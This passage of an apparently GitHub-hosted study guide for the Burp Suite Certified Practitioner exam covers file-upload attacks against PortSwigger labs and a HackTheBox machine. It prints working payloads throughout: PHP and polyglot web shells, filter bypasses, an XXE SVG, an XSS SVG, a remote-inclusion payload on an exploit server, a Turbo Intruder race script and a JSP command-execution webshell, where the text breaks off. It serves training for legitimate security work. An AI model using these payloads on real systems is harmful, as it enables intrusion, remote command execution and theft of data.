<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/file-upload.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/file-upload.png" alt="Identify file upload" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The PHP <code>source code</code> of the exploit.php file below will read the <code>/home/carlos/secret</code> sensitive information.</p>
</blockquote>
<div class="highlight highlight-text-html-php notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;"><pre><span class="pl-ent">&lt;?php</span> <span class="pl-k">echo</span> <span class="pl-en">file_get_contents</span>(<span class="pl-s">'<span class="pl-s">/home/carlos/secret</span>'</span>); <span class="pl-ent">?&gt;</span></pre></div>
<blockquote>
<p dir="auto">File upload vulnerabilities bypass techniques:</p>
</blockquote>
<ol dir="auto">
<li>Upload the file name and include obfuscated path traversal <code>..%2fexploit.php</code> and retrieve the content <code>GET /files/avatars/..%2fexploit.php</code>.</li>
<li>Upload a file named, <code>exploit.php%00.jpg</code> with trailing null byte character and get the file execution at <code>/files/avatars/exploit.php</code>.</li>
<li>Create <strong>polygot</strong> using valid image file, by running the command in bash terminal: <code>exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;" ./stickman.png -o polyglot2023.php</code>. Once polygot is uploaded, view the extracted data by issuing a GET request to the uploaded path <code>/files/avatars/polyglot.php</code> , and search the response content for the phrase <code>START</code> to obtain the sensitive data.</li>
<li>Upload two different files. First upload <code>.htaccess</code> with Content-Type: <code>text/plain</code>, and the file data value set to <code>AddType application/x-httpd-php .l33t</code>. This will allow the upload and execute of second file upload named, <code>exploit.l33t</code> with extension <code>l33t</code>.</li>
<li>MIME type <code>image/jpeg</code> or <code>image/png</code> is only allowed. Bypass the filter by specifying <code>Content-Type</code> to value of <code>image/jpeg</code> and then uploading <code>exploit.php</code> file.</li>
<li>If target allow <a href="#remote-file-inclusion">Remote File Include</a> (RFI), upload from remote URL, then host and exploit file with the following GIF magic bytes: <code>GIF89a; &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code>. The file name on exploit server could read <code>image.php%00.gif</code>.</li>
<li>Double file extension bypass filter <code>exploit.csv.php</code>.</li>
</ol>
<blockquote>
<p dir="auto">Matching file upload vulnerable labs:</p>
</blockquote>
<ol dir="auto">
<li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" rel="nofollow">PortSwigger Lab: Web shell upload via path traversal</a></li>
<li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" rel="nofollow">PortSwigger Lab: Web shell upload via obfuscated file extension</a></li>
<li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload" rel="nofollow">PortSwigger Lab: Remote code execution via polyglot web shell upload</a></li>
<li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass" rel="nofollow">PortSwigger Lab: Web shell upload via extension blacklist bypass</a></li>
<li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" rel="nofollow">PortSwigger Lab: Web shell upload via Content-Type restriction bypass</a></li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/file-upload-stages.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/file-upload-stages.png" alt="File upload stages" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">This <a href="https://youtu.be/QHhn0-ermck" rel="nofollow">intigriti walkthrough</a> great explanation of file upload lab.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">XXE via SVG Image upload</h3><a id="user-content-xxe-via-svg-image-upload" class="anchor" aria-label="Permalink: XXE via SVG Image upload" href="#xxe-via-svg-image-upload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> image upload on the blog post function that accept <strong>svg</strong> images, and observe that the avatars already on blog <code>source code</code> is <strong>svg</strong> extensions.</p>
</blockquote>
<blockquote>
<p dir="auto">The content of the image.svg file uploaded:</p>
</blockquote>
<div class="highlight highlight-text-xml-svg notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/carlos/secret&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;"><pre>&lt;?<span class="pl-ent">xml</span> <span class="pl-e">version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-e">standalone</span>=<span class="pl-s"><span class="pl-pds">"</span>yes<span class="pl-pds">"</span></span>?&gt;&lt;!<span class="pl-k">DOCTYPE</span> <span class="pl-c1">test</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>file:///home/carlos/secret<span class="pl-pds">"</span></span> &gt; ]&gt;&lt;<span class="pl-ent">svg</span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>128px<span class="pl-pds">"</span></span> <span class="pl-e">height</span>=<span class="pl-s"><span class="pl-pds">"</span>128px<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span>:<span class="pl-e">xlink</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/1999/xlink<span class="pl-pds">"</span></span> <span class="pl-e">version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.1<span class="pl-pds">"</span></span>&gt;&lt;<span class="pl-ent">text</span> <span class="pl-e">font-size</span>=<span class="pl-s"><span class="pl-pds">"</span>16<span class="pl-pds">"</span></span> <span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">y</span>=<span class="pl-s"><span class="pl-pds">"</span>16<span class="pl-pds">"</span></span>&gt;<span class="pl-c1">&amp;xxe;</span>&lt;/<span class="pl-ent">text</span>&gt;&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xxe-svg-upload.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xxe-svg-upload.png" alt="xxe svg upload file" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" rel="nofollow">PortSwigger Lab: Exploiting XXE via image file upload</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Remote File Inclusion</h3><a id="user-content-remote-file-inclusion" class="anchor" aria-label="Permalink: Remote File Inclusion" href="#remote-file-inclusion"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be <code>HTTPS</code> and the file <strong>extension</strong> is checked, but the MIME content type or file content is maybe not validated. Incorrect RFI result in response message, <code>File must be either a jpg or png</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Methods to bypass extension validation:</p>
</blockquote>
<ol dir="auto">
<li>Extension with varied capitalization, such as .<code>sVG</code></li>
<li>Double extension, such as <code>.jpg.svg</code> or <code>.svg.jpg</code></li>
<li>Extension with a <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/delimiters.txt">delimiter</a>, such as <code>%0a, %09, %0d, %00, #</code>. Other examples, <code>file.png%00.svg</code> or <code>file.png\x0d\x0a.svg</code></li>
<li>Empty filename, <code>.svg</code></li>
<li>Try to cut allowed extension with more than the maximum filename length.</li>
</ol>
<blockquote>
<p dir="auto">Below scenario could be exploited using <a href="#ssrf---server-side-request-forgery">SSRF</a> or RFI. Did not solve this challenge.....</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&amp;fileurl=https://EXPLOIT.net/image.sVg"><pre class="notranslate"><code>POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&amp;fileurl=https://EXPLOIT.net/image.sVg
</code></pre></div>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&amp;fileurl=http://localhost:6566/"><pre class="notranslate"><code>POST /admin-panel/admin-img-file
Host: TARGET.net
Cookie: session=AdminCookieTokenValue
Referer: https://TARGET.net/admin-panel

csrf=u4r8fg90d7b09j4mm6k67m3&amp;fileurl=http://localhost:6566/
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/RFI-function.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/RFI-function.png" alt="RFI function" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">I am missing some key info and need to <em><strong>identify</strong></em> PortSwigger research about RFI.</p>
</blockquote>
<blockquote>
<p dir="auto">But the method below works for sure. It is taken from DingyShark's git (<a href="https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities">https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities</a>)</p>
</blockquote>
<ol dir="auto">
<li>To exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:</li>
</ol>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;"><pre class="notranslate"><code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
</code></pre></div>
<ol start="2" dir="auto">
<li>To bypass filters and provoke RFI, use the next payload:</li>
</ol>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="https://exploit-server.com/shell.php#kek.jpg"><pre class="notranslate"><code>https://exploit-server.com/shell.php#kek.jpg
</code></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">XSS SVG Upload</h3><a id="user-content-xss-svg-upload" class="anchor" aria-label="Permalink: XSS SVG Upload" href="#xss-svg-upload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Uploading of SVG file that contains JavaScript that performs cross site scripting attack.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;

&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
   &lt;rect width=&quot;300&quot; height=&quot;100&quot; style=&quot;fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)&quot; /&gt;
   &lt;script type=&quot;text/javascript&quot;&gt;
      alert(&quot;XSS!&quot;);
   &lt;/script&gt;
&lt;/svg&gt;"><pre>&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> standalone</span>=<span class="pl-s"><span class="pl-pds">"</span>no<span class="pl-pds">"</span></span>?&gt;
&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">svg</span> PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;

&lt;<span class="pl-ent">svg</span> <span class="pl-e">version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.1<span class="pl-pds">"</span></span> <span class="pl-e">baseProfile</span>=<span class="pl-s"><span class="pl-pds">"</span>full<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span>&gt;
   &lt;<span class="pl-ent">rect</span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>300<span class="pl-pds">"</span></span> <span class="pl-e">height</span>=<span class="pl-s"><span class="pl-pds">"</span>100<span class="pl-pds">"</span></span> <span class="pl-e">style</span>=<span class="pl-s"><span class="pl-pds">"</span>fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)<span class="pl-pds">"</span></span> /&gt;
   &lt;<span class="pl-ent">script</span> <span class="pl-e">type</span>=<span class="pl-s"><span class="pl-pds">"</span>text/javascript<span class="pl-pds">"</span></span>&gt;
      alert("XSS!");
   &lt;/<span class="pl-ent">script</span>&gt;
&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Race Condition Web shell upload</h3><a id="user-content-race-condition-web-shell-upload" class="anchor" aria-label="Permalink: Race Condition Web shell upload" href="#race-condition-web-shell-upload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Image upload function <em><strong>identified</strong></em> on profile page.</p>
</blockquote>
<blockquote>
<p dir="auto">White box penetration test scenario, the vulnerable <em><strong>source code</strong></em> that introduces this race condition is supplied by the client for the target:</p>
</blockquote>
<div class="highlight highlight-text-html-php notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?php
$target_dir = &quot;avatars/&quot;;
$target_file = $target_dir . $_FILES[&quot;avatar&quot;][&quot;name&quot;];

// temporary move
move_uploaded_file($_FILES[&quot;avatar&quot;][&quot;tmp_name&quot;], $target_file);

if (checkViruses($target_file) &amp;&amp; checkFileType($target_file)) {
    echo &quot;The file &quot;. htmlspecialchars( $target_file). &quot; has been uploaded.&quot;;
} else {
    unlink($target_file);
    echo &quot;Sorry, there was an error uploading your file.&quot;;
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != &quot;jpg&quot; &amp;&amp; $imageFileType != &quot;png&quot;) {
        echo &quot;Sorry, only JPG &amp; PNG files are allowed\n&quot;;
        return false;
    } else {
        return true;
    }
}
?&gt;"><pre><span class="pl-ent">&lt;?php</span>
<span class="pl-s1"><span class="pl-c1">$</span>target_dir</span> = <span class="pl-s">"<span class="pl-s">avatars/</span>"</span>;
<span class="pl-s1"><span class="pl-c1">$</span>target_file</span> = <span class="pl-s1"><span class="pl-c1">$</span>target_dir</span> . <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_FILES</span></span>[<span class="pl-s">"<span class="pl-s">avatar</span>"</span>][<span class="pl-s">"<span class="pl-s">name</span>"</span>];

<span class="pl-c">// temporary move</span>
<span class="pl-en">move_uploaded_file</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_FILES</span></span>[<span class="pl-s">"<span class="pl-s">avatar</span>"</span>][<span class="pl-s">"<span class="pl-s">tmp_name</span>"</span>], <span class="pl-s1"><span class="pl-c1">$</span>target_file</span>);

<span class="pl-k">if</span> (<span class="pl-en">checkViruses</span>(<span class="pl-s1"><span class="pl-c1">$</span>target_file</span>) &amp;&amp; <span class="pl-en">checkFileType</span>(<span class="pl-s1"><span class="pl-c1">$</span>target_file</span>)) {
    <span class="pl-k">echo</span> <span class="pl-s">"<span class="pl-s">The file </span>"</span>. <span class="pl-en">htmlspecialchars</span>( <span class="pl-s1"><span class="pl-c1">$</span>target_file</span>). <span class="pl-s">"<span class="pl-s"> has been uploaded.</span>"</span>;
} <span class="pl-k">else</span> {
    <span class="pl-en">unlink</span>(<span class="pl-s1"><span class="pl-c1">$</span>target_file</span>);
    <span class="pl-k">echo</span> <span class="pl-s">"<span class="pl-s">Sorry, there was an error uploading your file.</span>"</span>;
    <span class="pl-en">http_response_code</span>(<span class="pl-c1">403</span>);
}

<span class="pl-k">function</span> <span class="pl-en">checkViruses</span>(<span class="pl-s1"><span class="pl-c1">$</span>fileName</span>) {
    <span class="pl-c">// checking for viruses</span>
    <span class="pl-c1">.</span>.<span class="pl-c1">.</span>
}

<span class="pl-k">function</span> <span class="pl-en">checkFileType</span>(<span class="pl-s1"><span class="pl-c1">$</span>fileName</span>) {
    <span class="pl-s1"><span class="pl-c1">$</span>imageFileType</span> = <span class="pl-en">strtolower</span>(<span class="pl-en">pathinfo</span>(<span class="pl-s1"><span class="pl-c1">$</span>fileName</span>,<span class="pl-c1">PATHINFO_EXTENSION</span>));
    <span class="pl-k">if</span>(<span class="pl-s1"><span class="pl-c1">$</span>imageFileType</span> != <span class="pl-s">"<span class="pl-s">jpg</span>"</span> &amp;&amp; <span class="pl-s1"><span class="pl-c1">$</span>imageFileType</span> != <span class="pl-s">"<span class="pl-s">png</span>"</span>) {
        <span class="pl-k">echo</span> <span class="pl-s">"<span class="pl-s">Sorry, only JPG &amp; PNG files are allowed</span>\n"</span>;
        <span class="pl-k">return</span> <span class="pl-c1">false</span>;
    } <span class="pl-k">else</span> {
        <span class="pl-k">return</span> <span class="pl-c1">true</span>;
    }
}
<span class="pl-ent">?&gt;</span></pre></div>
<blockquote>
<p dir="auto">The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete.</p>
</blockquote>
<blockquote>
<p dir="auto">PHP Payload to read the secret data <code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></p>
</blockquote>
<blockquote>
<p dir="auto">Right-click on the failed upload <code>POST /my-account/avatar</code> request that was used to submit the PHP Payload file upload and select <em><strong>Extensions &gt; Turbo Intruder &gt; Send to turbo intruder.</strong></em>
The Turbo Intruder window opens. Copy and paste the following race condition inducing script template into Turbo Intruder's Python editor:</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/race-condition-turbo-intruder.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/race-condition-turbo-intruder.png" alt="race-condition-turbo-intruder" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Race script template into Turbo Intruder's Python editor:</p>
</blockquote>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''&lt;YOUR-POST-REQUEST POST /my-account/avatar HTTP/2 filename=&quot;read-secret.php&quot;'''

    request2 = '''&lt;YOUR-GET-REQUEST&gt; GET /files/avatars/read-secret.php HTTP/2'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)"><pre><span class="pl-k">def</span> <span class="pl-en">queueRequests</span>(<span class="pl-s1">target</span>, <span class="pl-s1">wordlists</span>):
    <span class="pl-s1">engine</span> <span class="pl-c1">=</span> <span class="pl-en">RequestEngine</span>(<span class="pl-s1">endpoint</span><span class="pl-c1">=</span><span class="pl-s1">target</span>.<span class="pl-c1">endpoint</span>, <span class="pl-s1">concurrentConnections</span><span class="pl-c1">=</span><span class="pl-c1">10</span>,)

    <span class="pl-s1">request1</span> <span class="pl-c1">=</span> <span class="pl-s">'''&lt;YOUR-POST-REQUEST POST /my-account/avatar HTTP/2 filename="read-secret.php"'''</span>

    <span class="pl-s1">request2</span> <span class="pl-c1">=</span> <span class="pl-s">'''&lt;YOUR-GET-REQUEST&gt; GET /files/avatars/read-secret.php HTTP/2'''</span>

    <span class="pl-c"># the 'gate' argument blocks the final byte of each request until openGate is invoked</span>
    <span class="pl-s1">engine</span>.<span class="pl-c1">queue</span>(<span class="pl-s1">request1</span>, <span class="pl-s1">gate</span><span class="pl-c1">=</span><span class="pl-s">'race1'</span>)
    <span class="pl-k">for</span> <span class="pl-s1">x</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">5</span>):
        <span class="pl-s1">engine</span>.<span class="pl-c1">queue</span>(<span class="pl-s1">request2</span>, <span class="pl-s1">gate</span><span class="pl-c1">=</span><span class="pl-s">'race1'</span>)

    <span class="pl-c"># wait until every 'race1' tagged request is ready</span>
    <span class="pl-c"># then send the final byte of each request</span>
    <span class="pl-c"># (this method is non-blocking, just like queue)</span>
    <span class="pl-s1">engine</span>.<span class="pl-c1">openGate</span>(<span class="pl-s">'race1'</span>)

    <span class="pl-s1">engine</span>.<span class="pl-c1">complete</span>(<span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">60</span>)


<span class="pl-k">def</span> <span class="pl-en">handleResponse</span>(<span class="pl-s1">req</span>, <span class="pl-s1">interesting</span>):
    <span class="pl-s1">table</span>.<span class="pl-c1">add</span>(<span class="pl-s1">req</span>)</pre></div>
<blockquote>
<p dir="auto">results list, notice that some of the GET requests received a 200 response containing Carlos's secret.<br>
<a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/race-condition-read-secret.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/race-condition-read-secret.png" alt="race-condition-read-secret.png" style="max-width: 100%;"></a></p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition" rel="nofollow">PortSwigger Lab: Web shell upload via race condition</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">WebShell JSP File Upload</h3><a id="user-content-webshell-jsp-file-upload" class="anchor" aria-label="Permalink: WebShell JSP File Upload" href="#webshell-jsp-file-upload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target <code>strutted.htb</code> HackTheBox Lab machine restricted file upload only allows image files.</p>
</blockquote>
<blockquote>
<p dir="auto">Enumaration of a downloaded ZIP source code backup, identify CVE-2024-53677
File upload logic in Apache Struts is flawed.
Attacker can manipulate file upload to enable paths traversal and be used to perform Remote Code Execution.
CVE-2024-53677 issue affects Apache Struts from 2.0.0 before 6.4.0.</p>
</blockquote>
<blockquote>
<p dir="auto">The attack path is to emb a malicious JSP file into the contents of an image.<br>
The OGNL parameter abuse to change the name of the file to a JSP file which will let us trigger payloads.
We grab this payload from a similar disclosure, and copy the shell.jsp contents below the image header in our POST request.</p>
</blockquote>
<blockquote>
<p dir="auto">Source of <a href="https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp" rel="nofollow">JavaScript webshell.JSP</a></p>
</blockquote>
<div class="highlight highlight-text-html-jsp notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;
&lt;%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;
&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;
&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;
&lt;/FORM&gt;
&lt;pre&gt;
&lt;%
if (request.getParameter(&quot;cmd&quot;) != null) {
        out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);
        Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
